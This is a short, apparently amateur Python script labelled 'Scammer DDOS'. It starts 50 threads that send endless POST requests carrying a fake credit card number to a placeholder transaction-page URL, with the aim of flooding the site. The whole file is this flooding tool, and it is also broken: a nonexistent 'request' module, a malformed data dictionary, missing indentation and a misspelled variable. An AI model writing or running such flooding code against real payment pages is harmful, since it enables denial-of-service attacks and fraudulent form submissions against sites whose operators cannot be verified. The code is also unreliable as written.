#Scammer DDOS
#Fake card that will pass the forms 
# CC number: 4007000000027
# random month
# random year
# ccv : 234

import request
import threading

url = 'insert url to transaction page'

data = {
	insert data needed here (cc_number, ccexpmonth,etc)
}

def do_request():
while True:
	response = request.post(url, data = data).text
	print(response)


threads = []

for i in range (50):
	t = threading.Thread(target=do_request)
	t.daemon = True
	threads.append(t)
	
for i in range(50):
	treads[i].start()
	
for i in range(50):
	treads[i].join()